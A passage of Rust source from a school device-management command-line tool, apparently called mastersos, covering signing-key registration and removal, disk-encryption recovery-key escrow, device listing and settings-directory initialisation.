    std::path::absolute(p).map_err(|e| OpError::Failed(format!("Bad path {}: {e}", p.display())))
}

/// `Trusted keys: 11d9-03eb, 7c42-a915` for this manifest.
fn trusted_line(manifest_text: &str) -> Result<String, OpError> {
    let codes: Vec<String> = workdir::trusted_keys(manifest_text)
        .map_err(fail)?
        .iter()
        .map(|k| workdir::shown_code(&k.id))
        .collect();
    Ok(format!("Trusted keys: {}", codes.join(", ")))
}

const PUBLISH_NEXT: &str =
    "Now publish with a school key that is already trusted: mastersos publish --key-file <file>";

/// `mastersos key remove <KEY CODE> [--key-file <PATH>]`: only local data decides what is
/// removed. The disk-unlocking entry goes when its `# school key <code>` comment ties it to the
/// key, or when it is the one derived from the key's own file. Entries without either are listed
/// for IT; when this computer is connected, the server's word on each is shown beside it, and
/// nothing is removed on that basis.
async fn keys_remove(
    dir: Option<&Path>,
    code: &str,
    key_file: Option<&Path>,
    o: &V1,
) -> Result<ExitCode, OpError> {
    let file = match key_file {
        Some(p) => {
            let kit = crate::sign::kit::load_key_file(p).map_err(fail)?;
            let file_code = workdir::shown_code(&kit.key_id());
            match workdir::normalize_key_code(code) {
                Some(want) if want == file_code => {}
                // A code that is not a key code is refused below with its own message.
                None => {}
                Some(want) => {
                    return Err(OpError::Failed(format!(
                        "{} is school key {file_code}, not {want}. Nothing was changed.",
                        absolute(p)?.display()
                    )))
                }
            }
            Some(kit)
        }
        None => None,
    };
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let recipient = file.as_ref().map(|k| k.escrow_recipient());
    let r = workdir::remove_school_key(&w.manifest().map_err(fail)?, code, recipient.as_deref())
        .map_err(fail)?;
    let path = absolute(&w.root.join("manifest.toml"))?;
    let shown = workdir::shown_code(&r.key_id);
    if let Some(k) = &file {
        if k.key_id() != r.key_id {
            return Err(OpError::Failed(format!(
                "manifest.toml has a school key {shown} that does not match {}. Check which file is the right one. Nothing was changed.",
                absolute(key_file.unwrap_or(Path::new("")))?.display()
            )));
        }
    }
    w.write_manifest(&r.text).map_err(fail)?;
    println!("Removed school key {shown} from {}.", path.display());
    if file.is_none() && !r.recipient_removed && !r.unmarked.is_empty() {
        let said = server_says(&w, o).await;
        println!(
            "manifest.toml has disk-unlocking entries (under [school]) that this command could not match to {shown}:"
        );
        for u in &r.unmarked {
            match said.get(u) {
                Some(c) => println!("  {u}  (the server says: school key {c})"),
                None => println!("  {u}"),
            }
        }
        println!(
            "If you still have that key's file, run again with --key-file <file>: mastersos key remove {shown} --key-file <file>"
        );
        println!("Otherwise remove the one that belonged to {shown} by hand.");
    }
    println!("{}", trusted_line(&r.text)?);
    println!("{PUBLISH_NEXT}");
    Ok(ExitCode::SUCCESS)
}

/// Text from the server, without control characters, for a terminal.
fn printable(s: &str) -> String {
    s.chars().filter(|c| !c.is_control()).collect()
}

/// Best effort, for display only: the key code the server binds each disk-unlocking entry to,
/// when this computer is signed in and the folder belongs to the server `--server` names (if any).
/// Any failure gives nothing.
async fn server_says(w: &Workdir, o: &V1) -> std::collections::HashMap<String, String> {
    let fetch = async {
        let m = w.meta().ok()?;
        if let Some(flag) = &o.server {
            if origin_of(flag).ok()? != m.server {
                return None;
            }
        }
        let (creds, _) = crate::auth::resolve(Some(&m.server)).await.ok()?;
        let server = Server::new(&m.server, Some(&m.school_id), creds).ok()?;
        let listed: Vec<Value> = server.get_json("escrow-recipients").await.ok()?;
        Some(
            listed
                .iter()
                .filter_map(|l| {
                    let recipient = l.get("recipient")?.as_str()?;
                    let code = printable(&workdir::shown_code(l.get("bound_key_id")?.as_str()?));
                    (!code.is_empty()).then(|| (recipient.to_owned(), code))
                })
                .collect(),
        )
    };
    tokio::time::timeout(std::time::Duration::from_secs(15), fetch)
        .await
        .ok()
        .flatten()
        .unwrap_or_default()
}

// —— Protocol v1: init, pull, verify ——

/// The global options the protocol v1 commands use.
struct V1 {
    json: bool,
    yes: bool,
    server: Option<String>,
    /// `--school`.
    school: Option<String>,
    pin_flag: Option<PathBuf>,
    /// `--trust-fingerprint`.
    fingerprints: Vec<String>,
}

impl V1 {
    /// The first-use anchors of a command without a school key file: the fingerprints given, or
    /// a person at a terminal (not with `--yes` or `--json`).
    fn anchors(&self) -> crate::sign::chain::Anchors {
        use std::io::IsTerminal as _;
        crate::sign::chain::Anchors {
            keys: Vec::new(),
            fingerprints: self.fingerprints.clone(),
            interactive: !self.yes && !self.json && std::io::stdin().is_terminal(),
        }
    }
}

/// Run `init`, `pull`, `verify`, `publish`, `heartbeat` or a `key` command that talks to the server: what to print on stdout, or the error. With `--json` the
/// dialogue (fingerprints, chain notes) goes to stderr and stdout holds one JSON value.
async fn v1_command(o: &V1, cmd: Cmd) -> Result<String, CliError> {
    use std::io::IsTerminal as _;
    // School key files first: `--key-file -` reads stdin, before the dialogue holds it.
    let keys = match &cmd {
        Cmd::Init { key_file, .. } if key_file.is_empty() => {
            return Err(CliError::usage(
                "mastersos init needs a school key file: --key-file <PATH>. Make one with: mastersos key new --out <FOLDER> --school-name <name>, then register it with mastersos key register --key-file <PATH> --label <name>.",
            ))
        }
        Cmd::Init { key_file, .. } => load_school_keys(key_file)
            .map_err(|e| CliError::new("key_file_invalid", e.message()))?,
        // Settings are approved on this computer with the school key; nothing is uploaded without it.
        Cmd::Publish { key_file: None, .. } => {
            return Err(CliError::usage(
                "Publishing needs the school key file: mastersos publish --key-file <PATH>",
            ))
        }
        Cmd::Key(KeyCmd::Register { key_file: f, .. })
        | Cmd::Key(KeyCmd::Add { file: f, .. })
        | Cmd::Key(KeyCmd::Remove {
            key_file: Some(f), ..
        })
        | Cmd::Publish {
            key_file: Some(f), ..
        }
        | Cmd::Recovery(RecoveryCmd::Read { key_file: f, .. })
        | Cmd::Heartbeat { key_file: f, .. } => load_school_keys(std::slice::from_ref(f))
            .map_err(|e| CliError::new("key_file_invalid", e.message()))?,
        _ => Vec::new(),
    };
    let stdin = std::io::stdin();
    let interactive = !o.yes && !o.json && stdin.is_terminal();
    // Publishing and the check-in ask the person to confirm; without one (`--json`, or stdin not
    // a terminal) only `--yes` goes on. Refused before the network: nothing is read from stdin
    // and nothing is uploaded.
    if matches!(cmd, Cmd::Publish { .. } | Cmd::Heartbeat { .. }) && !o.yes && !interactive {
        return Err(CliError::usage(
            "nobody can confirm here (--json, or stdin is not a terminal): pass --yes to go on without the confirmation",
        ));
    }
    let mut confirm = stdin.lock();
    let (mut stdout, mut stderr) = (std::io::stdout(), std::io::stderr());
    let out: &mut dyn std::io::Write = if o.json { &mut stderr } else { &mut stdout };
    match cmd {
        Cmd::Init { dir, .. } => {
            init_v1(
                o,
                &dir,
                keys,
                o.school.as_deref(),
                interactive,
                &mut confirm,
                out,
            )
            .await
        }
        Cmd::Pull {
            dir,
            version,
            force,
        } => {
            let dir = dir.unwrap_or_else(|| PathBuf::from("."));
            pull_v1(
                o,
                &dir,
                version,
                force,
                o.school.as_deref(),
                &mut confirm,
                out,
            )
            .await
        }
        Cmd::Verify => verify_v1(o, o.school.as_deref(), &mut confirm, out).await,
        Cmd::Key(KeyCmd::Register { label, .. }) => {
            let ctx = KeyCtx {
                o,
                dir: None,
                school: o.school.as_deref(),
                interactive,
            };
            key_register(&ctx, &keys, &label, &mut confirm, out).await
        }
        Cmd::Key(KeyCmd::List { dir }) => {
            let ctx = KeyCtx {
                o,
                dir: dir.as_deref(),
                school: o.school.as_deref(),
                interactive,
            };
            key_list(&ctx, &mut confirm, out).await
        }
        Cmd::Key(KeyCmd::Add { dir, .. }) => {
            let ctx = KeyCtx {
                o,
                dir: dir.as_deref(),
                school: o.school.as_deref(),
                interactive,
            };
            key_add(&ctx, &keys, &mut confirm, out).await
        }
        Cmd::Publish {
            dir, allow_reroute, ..
        } => {
            let kit = &keys
                .first()
                .ok_or_else(|| CliError::usage("no school key"))?
                .kit;
            publish_v1(o, dir.as_deref(), kit, &allow_reroute, &mut confirm, out).await
        }
        Cmd::Heartbeat { days, .. } => {
            let kit = &keys
                .first()
                .ok_or_else(|| CliError::usage("no school key"))?
                .kit;
            let ctx = KeyCtx {
                o,
                dir: None,
                school: o.school.as_deref(),
                interactive,
            };
            heartbeat_v1(&ctx, kit, days, &mut confirm, out).await
        }
        Cmd::Recovery(RecoveryCmd::Read { device, .. }) => {
            let ctx = KeyCtx {
                o,
                dir: None,
                school: o.school.as_deref(),
                interactive,
            };
            recovery_read_v1(&ctx, &keys, &device, &mut confirm, out).await
        }
        Cmd::Devices(c) => {
            let ctx = KeyCtx {
                o,
                dir: None,
                school: o.school.as_deref(),
                interactive,
            };
            devices_v1(&ctx, c, &mut confirm, out).await
        }
        Cmd::Key(KeyCmd::Remove {
            code,
            dir,
            unregister: true,
            ..
        }) => {
            let ctx = KeyCtx {
                o,
                dir: dir.as_deref(),
                school: o.school.as_deref(),
                interactive,
            };
            key_unregister(&ctx, &code, keys.first(), &mut confirm, out).await
        }
        Cmd::Seed(SeedCmd::Make {
            group,
            out: path,
            dir,
        }) => {
            let ctx = KeyCtx {
                o,
                dir: dir.as_deref(),
                school: o.school.as_deref(),
                interactive,
            };
            // Without a person nothing is read from stdin.
            let mut nobody = std::io::empty();
            let confirm: &mut dyn std::io::BufRead = if interactive {
                &mut confirm
            } else {
                &mut nobody
            };
            seed_make_v1(&ctx, group.as_deref(), &path, confirm, out).await
        }
        _ => Err(CliError::usage("not a protocol v1 command")),
    }
}

/// A local file problem; the message names the file, never its content.
fn local_file(e: impl std::fmt::Display) -> CliError {
    CliError::new("local_file", &crate::safe::text(&format!("{e:#}")))
}

/// The origin of a server address, as `--server` takes it.
fn origin_of(s: &str) -> Result<String, CliError> {
    Ok(crate::server::check_origin(s)?
        .origin()
        .ascii_serialization())
}

/// The `mastersos.toml` of `dir`, when it is a settings directory. Its server must be an origin
/// and its school a lowercase UUID: a directory of the old admin API is refused.
fn dir_meta(dir: &Path) -> Result<Option<Meta>, CliError> {
    match std::fs::symlink_metadata(dir.join("mastersos.toml")) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        _ => {}
    }
    let m = Workdir::open(dir)
        .and_then(|w| w.meta())
        .map_err(local_file)?;
    let old = || {
        CliError::new(
            "local_file",
            &format!(
                "{} is from an older version of mastersos (its server is not an origin, or its school id is not a lowercase UUID): pull into a new directory",
                dir.join("mastersos.toml").display()
            ),
        )
    };
    if origin_of(&m.server).map_err(|_| old())? != m.server
        || !crate::server::is_school_id(&m.school_id)
    {
        return Err(old());
    }
    Ok(Some(m))
}

/// The credentials and the server origin: `--server`, else the directory's server, else the one
/// the credentials name. The credentials must be for that server.
async fn resolve_v1(
    o: &V1,
    meta: Option<&Meta>,
) -> Result<(crate::auth::Credentials, String), CliError> {
    let flag = o.server.as_deref().map(origin_of).transpose()?;
    if let (Some(f), Some(m)) = (&flag, meta) {
        if *f != m.server {
            return Err(CliError::new(
                "school_mismatch",
                &format!("the directory belongs to {}, not to {f}", m.server),
            ));
        }
    }
    let wanted = flag.or_else(|| meta.map(|m| m.server.clone()));
    let (creds, named) = crate::auth::resolve(wanted.as_deref()).await?;
    let origin = wanted.or(named).ok_or_else(|| {
        CliError::new(
            "not_configured",
            "no server: pass --server <URL>, or sign in with `mastersos login --server <URL>`",
        )
    })?;
    Ok((creds, origin))
}

/// The school `--school` names, else the directory's; they must agree.
fn school_of(flag: Option<&str>, meta: Option<&Meta>) -> Result<String, CliError> {
    match (flag, meta) {
        (Some(f), Some(m)) if f != m.school_id => Err(CliError::new(
            "school_mismatch",
            &format!(
                "the directory belongs to school {}, not to {f}",
                m.school_id
            ),
        )),
        (Some(f), _) => Ok(f.to_owned()),
        (None, Some(m)) => Ok(m.school_id.clone()),
        (None, None) => Err(CliError::new(
            "not_configured",
            "no school is set: pass --school <UUID>",
        )),
    }
}

/// The school `init` works on when `--school` is not given (R8): none is an error, one is taken,
/// several are asked for by number, or refused with the list when there is no one to ask.
pub(crate) fn choose_school(
    list: Vec<SchoolEntry>,
    interactive: bool,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<SchoolEntry, CliError> {
    let shown = |s: &SchoolEntry| format!("{}  {}", s.id, crate::safe::field(&s.name));
    match list.len() {
        0 => Err(CliError::new(
            "not_configured",
            "this account administers no school",
        )),
        1 => {
            let s = list
                .into_iter()
                .next()
                .ok_or_else(|| CliError::usage("no school"))?;
            writeln!(out, "School: {}", shown(&s)).map_err(local_file)?;
            Ok(s)
        }
        n if !interactive => {
            let mut e = CliError::usage(&format!(
                "this account administers {n} schools: pass --school <UUID> with one of them"
            ));
            e.problems = list
                .iter()
                .map(|s| serde_json::Value::String(shown(s)))
                .collect();
            Err(e)
        }
        n => {
            writeln!(out, "This account administers {n} schools:").map_err(local_file)?;
            for (i, s) in list.iter().enumerate() {
                writeln!(out, "  {}. {}", i + 1, shown(s)).map_err(local_file)?;
            }
            let typed = crate::sign::ask(confirm, out, "Type the number of the school: ")
                .map_err(|_| CliError::new("cancelled", "no school was chosen; cancelled"))?;
            match typed.parse::<usize>() {
                Ok(i) if (1..=n).contains(&i) => Ok(list
                    .into_iter()
                    .nth(i - 1)
                    .ok_or_else(|| CliError::usage("no school"))?),
                _ => Err(CliError::usage(&format!(
                    "{} is not a number from 1 to {n}",
                    crate::safe::field(&typed)
                ))),
            }
        }
    }
}

/// What a `key` command that talks to the server is given.
struct KeyCtx<'a> {
    o: &'a V1,
    /// `--dir`.
    dir: Option<&'a Path>,
    /// `--school`.
    school: Option<&'a str>,
    interactive: bool,
}

impl KeyCtx<'_> {
    /// The settings directory's mastersos.toml: `--dir` must be one, the current directory may
    /// be.
    fn meta(&self) -> Result<Option<Meta>, CliError> {
        let meta = dir_meta(self.dir.unwrap_or_else(|| Path::new(".")))?;
        if meta.is_none() {
            if let Some(d) = self.dir {
                return Err(CliError::usage(&format!(
                    "{} is not a settings directory (no mastersos.toml)",
                    d.display()
                )));
            }
        }
        Ok(meta)
    }

    /// The server for this command: the school from `--school`, the directory, or the account's
    /// schools (the only one, or asked for).
    async fn server(
        &self,
        meta: Option<&Meta>,
        confirm: &mut dyn std::io::BufRead,
        out: &mut dyn std::io::Write,
    ) -> Result<(Server, String), CliError> {
        let (creds, origin) = resolve_v1(self.o, meta).await?;
        let school = if self.school.is_some() || meta.is_some() {
            school_of(self.school, meta)?
        } else {
            let list = Server::new(&origin, None, creds.clone())?.schools().await?;
            choose_school(list, self.interactive, confirm, out)?.id
        };
        Ok((Server::new(&origin, Some(&school), creds)?, school))
    }
}

/// `mastersos key register --key-file PATH --label TEXT`.
async fn key_register(
    ctx: &KeyCtx<'_>,
    keys: &[SchoolKey],
    label: &str,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let kit = &keys
        .first()
        .ok_or_else(|| CliError::usage("no school key"))?
        .kit;
    let meta = ctx.meta()?;
    let (server, _) = ctx.server(meta.as_ref(), confirm, out).await?;
    let r = crate::sign::kit::register(&server, kit, label).await?;
    let code = crate::sign::kit::code_of(kit);
    if ctx.o.json {
        return Ok(format!(
            "{}\n",
            json!({"key_id": r.key_id, "key_code": code, "fingerprint": r.fingerprint,
                "key_already_registered": r.key_already,
                "recipient": r.recipient, "recipient_already_registered": r.recipient_already})
        ));
    }
    let mut s = String::new();
    if r.key_already {
        s.push_str(&format!("School key {code} is already registered.\n"));
    } else {
        s.push_str(&format!("Registered school key {code} ({}).\n", r.key_id));
    }
    if r.recipient_already {
        s.push_str(&format!(
            "Disk unlocking for school key {code} is already registered.\n"
        ));
    } else {
        s.push_str(&format!(
            "Disk unlocking registered for school key {code}.\n"
        ));
    }
    Ok(s)
}

/// `mastersos key list [--dir DIR]`: the registered school keys and disk-unlocking recipients,
/// and whether the local directory trusts each key.
async fn key_list(
    ctx: &KeyCtx<'_>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = ctx.meta()?;
    let local: Option<Vec<mastersos_bundle::TrustKey>> = match &meta {
        Some(_) => {
            let w = Workdir::open(ctx.dir.unwrap_or_else(|| Path::new("."))).map_err(local_file)?;
            Some(workdir::trusted_keys(&w.manifest().map_err(local_file)?).map_err(local_file)?)
        }
        None => None,
    };
    let (server, _) = ctx.server(meta.as_ref(), confirm, out).await?;
    let mut keys: Vec<Value> = server.get_json("keys").await?;
    let recipients: Vec<Value> = server.get_json("escrow-recipients").await?;
    let text_of = |v: &Value, k: &str| v.get(k).and_then(Value::as_str).map(printable);
    let in_directory = |v: &Value| {
        let pk = v.get("public_key").and_then(Value::as_str);
        match (&local, pk) {
            (Some(l), Some(pk)) => l.iter().any(|k| k.public_key == pk),
            _ => false,
        }
    };
    if ctx.o.json {
        for k in &mut keys {
            let here = in_directory(k);
            if let Value::Object(m) = k {
                m.insert("in_directory".into(), json!(here));
            }
        }
        return Ok(format!(
            "{}\n",
            json!({"keys": keys, "escrow_recipients": recipients})
        ));
    }
    let yes_no = |b: Option<bool>| b.map_or("-", |b| if b { "yes" } else { "no" }).to_owned();
    let day = |v: &Value, k: &str| {
        text_of(v, k).map_or("-".to_owned(), |t| t.chars().take(10).collect::<String>())
    };
    let rows = keys
        .iter()
        .map(|k| {
            vec![
                text_of(k, "key_id").map_or("-".into(), |id| printable(&workdir::shown_code(&id))),
                text_of(k, "label").unwrap_or_default(),
                day(k, "created_at"),
                yes_no(k.get("in_latest_trust").and_then(Value::as_bool)),
                yes_no(local.as_ref().map(|_| in_directory(k))),
                day(k, "last_used_at"),
            ]
        })
        .collect();
    let mut s = table(
        &[
            "KEY CODE",
            "LABEL",
            "REGISTERED",
            "IN LATEST TRUST",
            "IN THIS DIRECTORY",
            "LAST USED",
        ],
        rows,
    );
    s.push('\n');
    if !recipients.is_empty() {
        let rows = recipients
            .iter()
            .map(|r| {
                vec![
                    text_of(r, "bound_key_id")
                        .map_or("-".into(), |id| printable(&workdir::shown_code(&id))),
                    text_of(r, "label").unwrap_or_default(),
                    day(r, "created_at"),
                    yes_no(r.get("in_latest").and_then(Value::as_bool)),
                ]
            })
            .collect();
        s.push_str("\nDisk unlocking:\n");
        s.push_str(&table(
            &["KEY CODE", "LABEL", "REGISTERED", "IN LATEST TRUST"],
            rows,
        ));
        s.push('\n');
    }
    Ok(s)
}

/// `mastersos key add FILE [--dir DIR]`: only the local manifest.toml changes, after the server
/// lists the school key.
async fn key_add(
    ctx: &KeyCtx<'_>,
    keys: &[SchoolKey],
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = ctx.meta()?.ok_or_else(|| {
        CliError::usage("this is not a settings directory (no mastersos.toml): pass --dir")
    })?;
    let dir = ctx.dir.unwrap_or_else(|| Path::new("."));
    let w = Workdir::open(dir).map_err(local_file)?;
    let (server, school) = ctx.server(Some(&meta), confirm, out).await?;
    ensure_keys_registered(&server, keys, &school).await?;
    let mut text = w.manifest().map_err(local_file)?;
    for k in keys {
        text = workdir::add_trusted_key(&text, &k.kit.trust_key(), &k.kit.escrow_recipient())
            .map_err(local_file)?;
    }
    w.write_manifest(&text).map_err(local_file)?;
    let path = std::path::absolute(w.root.join("manifest.toml")).map_err(local_file)?;
    let trusted = trusted_line(&text).map_err(|e| local_file(e.message()))?;
    if ctx.o.json {
        let added: Vec<String> = keys.iter().map(SchoolKey::code).collect();
        return Ok(format!(
            "{}\n",
            json!({"added": added, "manifest": path.display().to_string(), "trusted": trusted})
        ));
    }
    let mut s = String::new();
    for k in keys {
        s.push_str(&format!(
            "Added school key {} to {}.\n",
            k.code(),
            path.display()
        ));
    }
    s.push_str(&format!("{trusted}\n{PUBLISH_NEXT}\n"));
    Ok(s)
}

/// `mastersos recovery read DEVICE --key-file PATH`: the school key must be registered; the rows
/// come newest first and are opened here. The keys are printed on stdout and nowhere else.
async fn recovery_read_v1(
    ctx: &KeyCtx<'_>,
    keys: &[SchoolKey],
    device: &str,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let kit = &keys
        .first()
        .ok_or_else(|| CliError::usage("no school key"))?
        .kit;
    let meta = ctx.meta()?;
    let (server, school) = ctx.server(meta.as_ref(), confirm, out).await?;
    ensure_keys_registered(&server, keys, &school).await?;
    let rows = crate::sign::kit::recovery_rows(&server, kit, device).await?;
    let opened = rows.iter().filter(|r| r.recovery_key.is_some()).count();
    if !rows.is_empty() && opened == 0 {
        let mut e = CliError::new(
            "not_opened",
            &format!(
                "none of the {} stored recovery key(s) could be opened with this school key",
                rows.len()
            ),
        );
        e.problems = rows
            .iter()
            .map(|r| {
                Value::String(format!(
                    "{}: {}",
                    r.luks_uuid,
                    r.note.as_deref().unwrap_or("not opened")
                ))
            })
            .collect();
        return Err(e);
    }
    if ctx.o.json {
        let v: Vec<Value> = rows
            .iter()
            .map(|r| {
                json!({
                    "luks_uuid": r.luks_uuid,
                    "received_at": r.received_at,
                    "serial": r.serial,
                    "first_for_luks": r.first_for_luks,
                    "recovery_key": r.recovery_key.as_ref().map(|k| k.as_str()),
                    "note": r.note,
                })
            })
            .collect();
        return Ok(format!("{}\n", Value::Array(v)));
    }
    if rows.is_empty() {
        return Ok(format!(
            "No recovery keys escrowed for {}.\n",
            crate::safe::field(device)
        ));
    }
    let mut s = String::new();
    for r in &rows {
        s.push_str(&format!(
            "{}  {}  serial={}  ",
            crate::safe::field(&r.luks_uuid),
            crate::safe::field(&r.received_at),
            r.serial
                .as_deref()
                .map_or("-".to_owned(), crate::safe::field)
        ));
        match (&r.recovery_key, &r.note) {
            (Some(k), None) => s.push_str(k),
            (Some(k), Some(n)) => s.push_str(&format!("{}  ({n})", k.as_str())),
            (None, n) => s.push_str(&format!("({})", n.as_deref().unwrap_or("not opened"))),
        }
        s.push('\n');
    }
    s.push_str(&format!("{opened} recovery key(s) opened.\n"));
    Ok(s)
}

/// One value for a line or a table cell, safe to show.
fn shown(v: &Value) -> String {
    crate::safe::field(&cell(v))
}

/// `mastersos devices list|show`: `GET devices`, and `GET devices/{id}` for one.
async fn devices_v1(
    ctx: &KeyCtx<'_>,
    cmd: DevicesCmd,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = ctx.meta()?;
    let (server, _) = ctx.server(meta.as_ref(), confirm, out).await?;
    let invalid = || {
        CliError::new(
            "invalid_answer",
            "the server's answer is not what was expected",
        )
    };
    let listed = |v: Value| -> Result<Vec<Value>, CliError> {
        match v {
            Value::Array(a) => Ok(a),
            _ => Err(invalid()),
        }
    };
    match cmd {
        DevicesCmd::List { group, .. } => {
            let mut list = listed(server.get_json("devices").await?)?;
            if let Some(g) = &group {
                list.retain(|d| d["group"].as_str() == Some(g.as_str()));
            }
            if ctx.o.json {
                return Ok(format!("{}\n", Value::Array(list)));
            }
            let rows = list
                .iter()
                .map(|d| {
                    let state: Vec<&str> = [
                        ("behind", "behind"),
                        ("has_errors", "errors"),
                        ("fetch_token_stale", "stale"),
                    ]
                    .iter()
                    .filter(|(k, _)| d[*k] == true)
                    .map(|(_, label)| *label)
                    .collect();
                    vec![
                        shown(&d["device_id"]),
                        shown(&d["serial"]),
                        shown(&d["group"]),
                        shown(&d["bundle_version"]),
                        shown(&d["last_seen"]),
                        if state.is_empty() {
                            "ok".into()
                        } else {
                            state.join(",")
                        },
                    ]
                })
                .collect();
            Ok(format!(
                "{}\n",
                table(
                    &["DEVICE", "SERIAL", "GROUP", "VERSION", "LAST SEEN", "STATE"],
                    rows
                )
            ))
        }
        DevicesCmd::Show { device, .. } => {
            let list = listed(server.get_json("devices").await?)?;
            // An id wins; else a serial (any case) names the device; else the server is asked
            // for the id as given.
            let want = device.trim().to_lowercase();
            let id = if list
                .iter()
                .any(|d| d["device_id"].as_str() == Some(&device))
            {
                device.clone()
            } else {
                let by_serial: Vec<&str> = list
                    .iter()
                    .filter(|d| {
                        d["serial"]
                            .as_str()
                            .is_some_and(|s| s.trim().to_lowercase() == want)
                    })
                    .filter_map(|d| d["device_id"].as_str())
                    .collect();
                match by_serial.as_slice() {
                    [] => device.clone(),
                    [one] => (*one).to_owned(),
                    many => {
                        let ids: Vec<String> = many.iter().map(|i| crate::safe::field(i)).collect();
                        return Err(CliError::usage(&format!(
                            "{} is the serial number of {} Devices ({}): use the device id",
                            crate::safe::field(&device),
                            many.len(),
                            ids.join(", ")
                        )));
                    }
                }
            };
            let found: Value = server
                .get_json(&format!("devices/{}", crate::server::segment(&id)?))
                .await?;
            if ctx.o.json {
                return Ok(format!("{found}\n"));
            }
            let Value::Object(m) = &found else {
                return Err(invalid());
            };
            let mut s = String::new();
            for (k, v) in m {
                s.push_str(&format!("{}: {}\n", crate::safe::field(k), shown(v)));
            }
            Ok(s)
        }
    }
}

/// `mastersos key remove CODE --unregister [--key-file PATH]`: `DELETE keys/{key_id}`.
async fn key_unregister(
    ctx: &KeyCtx<'_>,
    code: &str,
    file: Option<&SchoolKey>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let want = workdir::normalize_key_code(code).ok_or_else(|| {
        CliError::usage(&format!(
            "{} is not a key code (8 letters and digits, like 11d9-03eb)",
            crate::safe::field(code)
        ))
    })?;
    let key_id = match file {
        Some(k) if k.code() != want => {
            return Err(CliError::usage(&format!(
                "the key file is school key {}, not {want}. Nothing was changed.",
                k.code()
            )))
        }
        Some(k) => k.kit.key_id(),
        None => format!("rk-{}", want.replace('-', "")),
    };
    let meta = ctx.meta()?;
    let (server, _) = ctx.server(meta.as_ref(), confirm, out).await?;
    let route = format!("keys/{}", crate::server::segment(&key_id)?);
    match server.delete(&route).await {
        Ok(()) => {}
        Err(e) if e.code == "key_still_trusted" => {
            return Err(CliError::new(
                "key_still_trusted",
                &format!(
                    "school key {want} is still trusted by the latest published settings (or one of its disk-unlocking entries is still listed): publish a version without it first"
                ),
            ))
        }
        Err(e) => return Err(e),
    }
    if ctx.o.json {
        return Ok(format!(
            "{}\n",
            json!({"unregistered": key_id, "key_code": want})
        ));
    }
    Ok(format!(
        "Unregistered school key {want} and its disk unlocking from the server.\n"
    ))
}

/// `GET keys`, as far as `init` reads it.
#[derive(Deserialize)]
struct RegisteredKey {
    key_id: String,
    #[serde(default)]
    public_key: String,
    #[serde(default)]
    fingerprint: String,
}

/// Every school key must be registered for the school: `GET keys` lists it with the same key id,
/// public key and fingerprint. Nothing from the answer is written anywhere.
async fn ensure_keys_registered(
    server: &Server,
    keys: &[SchoolKey],
    school: &str,
) -> Result<(), CliError> {
    let registered: Vec<RegisteredKey> = server.get_json("keys").await?;
    for k in keys {
        let tk = k.kit.trust_key();
        let fp = mastersos_bundle::trust_fingerprint(&tk);
        let ok = registered
            .iter()
            .any(|r| r.key_id == tk.id && r.public_key == tk.public_key && r.fingerprint == fp);
        if !ok {
            return Err(CliError::new(
                "key_not_trusted",
                &format!(
                    "school key {} is not registered for school {school}. Register it first with `mastersos key register --key-file <file> --label <name>`.",
                    k.code()
                ),
            ));
        }
    }
    Ok(())
}

/// `mastersos init DIR --key-file PATH… [--school UUID] [--server URL]`: the trusted keys and the
/// disk-unlocking recipients come from the school key files only; the server is asked only
/// whether each key is registered (same id, public key and fingerprint). Nothing is written when
/// one is not.
async fn init_v1(
    o: &V1,
    dir: &Path,
    keys: Vec<SchoolKey>,
    school: Option<&str>,
    interactive: bool,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    if !workdir::is_free(dir).map_err(local_file)? {
        return Err(CliError::usage(&format!(
            "{} is not empty: init starts a new directory",
            dir.display()
        )));
    }
    let (creds, origin) = resolve_v1(o, None).await?;
    let (school, name) = match school {
        Some(s) => (s.to_owned(), None),
        None => {
            let list = Server::new(&origin, None, creds.clone())?.schools().await?;
            let s = choose_school(list, interactive, confirm, out)?;
            (s.id, Some(s.name))
        }
    };
    let server = Server::new(&origin, Some(&school), creds)?;
    let latest = server.latest_version().await?;
    if latest > 0 {
        return Err(CliError::new(
            "version_conflict",
            &format!(
                "the school already has published settings (version {latest}): use `mastersos pull {}`",
                dir.display()
            ),
        ));
    }
    ensure_keys_registered(&server, &keys, &school).await?;
    let pairs: Vec<(mastersos_bundle::TrustKey, String)> = keys
        .iter()
        .map(|k| (k.kit.trust_key(), k.kit.escrow_recipient()))
        .collect();
    let text = workdir::set_trusted_keys(&workdir::template(&school).map_err(local_file)?, &pairs)
        .map_err(local_file)?;
    let meta = Meta {
        server: origin.clone(),
        school_id: school.clone(),
        base_version: 0,
    };
    Workdir::init(dir, meta, &text).map_err(local_file)?;
    let abs = std::path::absolute(dir).map_err(local_file)?;
    let codes: Vec<String> = keys.iter().map(SchoolKey::code).collect();
    if o.json {
        return Ok(format!(
            "{}\n",
            json!({"created": abs.display().to_string(), "server": origin, "school_id": school, "trusted_keys": codes})
        ));
    }
    let whose = match name {
        Some(n) => crate::safe::field(&n),
        None => format!("school {school}"),
    };
    Ok(format!(
        "Created {} for {whose}.\n  manifest.toml  the settings for every computer: edit this file\n  secrets.toml   Wi-Fi passwords and other secrets that manifest.toml names as \"secret:<name>\"; keep it private\n{}\nNext: edit manifest.toml, then run `mastersos check`.\n",
        abs.display(),
        trusted_line(&text).map_err(|e| local_file(e.message()))?
    ))
}

/// `mastersos pull [DIR] [--version N] [--force] [--school UUID] [--server URL]`: the chain is
/// verified from the pin first; an older `--version` is taken only if this computer verified it
/// before (the pin's recorded digest).
async fn pull_v1(
    o: &V1,
    dir: &Path,
    version: Option<u64>,
    force: bool,
    school: Option<&str>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
